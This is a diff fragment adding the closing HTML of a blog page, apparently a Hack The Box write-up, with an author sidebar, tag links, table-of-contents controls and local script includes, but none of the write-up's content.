+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image -->
+    <div class="author-img">
+      
+        <figure class="avatar avatar-lg">
+          <img src="/avatar.png" alt="...">
+        </figure>
+      
+    </div>
+
+    <!-- Author title -->
+    <div class="author-title">
+      <div>DiegoExploit</div>
+      <div>2020-07-03</div>
+    </div>
+  </div>
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>
+
+      <a class="tag-link" href="/tags/linux/" rel="tag">#Windows</a> <a class="tag-link" href="/tags/sqli/" rel="tag">#ReverseTunneling</a> <a class="tag-link" href="/tags/ssh/" rel="tag">#</a>
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+</body>
+</html>
+
+
+<script src="/js/book.js"></script>
